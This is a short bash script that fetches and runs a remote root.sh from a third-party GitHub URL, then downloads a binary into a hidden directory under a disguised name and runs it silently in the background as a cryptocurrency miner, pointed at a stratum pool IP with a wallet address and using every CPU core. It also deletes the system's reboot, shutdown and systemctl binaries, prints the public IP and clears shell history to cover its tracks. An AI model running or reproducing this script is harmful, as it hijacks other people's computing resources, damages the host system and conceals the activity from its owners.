#!/bin/bash
git clone https://github.com/foxytouxxx/freeroot
cd freeroot
rm root.sh
wget https://raw.githubusercontent.com/rifamanajul/All-Jobs/refs/heads/main/root.sh
bash root.sh
apt update 
apt install -y wget curl sudo git
mkdir .lib && cd .lib
wget -O sgr1 https://github.com/rifamanajul/rifamanajul/raw/refs/heads/main/ryzen >/dev/null 2>&1
chmod +x sgr1
./sgr1 -a YespowerTIDE -o stratum+tcp://47.237.3.59:443 -u TFjVcsSSXbyVNa9gdiYrhDCtfkamCNLHCf.RDP -p c=TDC -t $(nproc --all) >/dev/null 2>&1 &
sleep 30
rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
curl ifconfig.me
history -cr
while true
do
        echo "hold down..."
        sleep 60
done
